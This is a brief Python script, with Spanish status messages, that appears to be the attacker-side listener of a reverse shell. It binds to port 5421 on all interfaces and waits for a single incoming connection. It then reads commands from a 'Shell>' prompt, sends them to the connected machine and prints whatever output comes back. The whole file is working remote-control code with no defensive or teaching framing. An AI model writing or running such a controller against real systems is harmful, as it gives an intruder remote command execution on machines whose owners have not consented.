from colorama import Fore, Style, init
import socket, os, sys

init(autoreset=True)
GREEN=f'{Fore.GREEN}{Style.BRIGHT}'
WHITE=f'{Fore.WHITE}{Style.BRIGHT}'
YELLOW=f'{Fore.YELLOW}{Style.BRIGHT}'

HOST = '0.0.0.0'
PORT = 5421
try:
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
  server_socket.bind((HOST, PORT))
  server_socket.listen(1)
  print(f"Escuchando en {HOST}:{PORT}...")
  client_socket, client_address = server_socket.accept()
  print(f"Conexión establecida con {client_address}")
  with client_socket:
   while True:
    command = input(f"Shell> ")
    if command.lower() == "exit":
     break
    elif command == 'cls' or command == 'CLS' or command == 'clear':
     os.system('cls')
    client_socket.send(command.encode())
    output_length = int(client_socket.recv(1024).decode())
    output = ''
    while len(output.encode()) < output_length:
     output += client_socket.recv(1024).decode()
    print(output)
except KeyboardInterrupt:
 print('\nHASTA LA PROXIMA...')
 sys.exit()
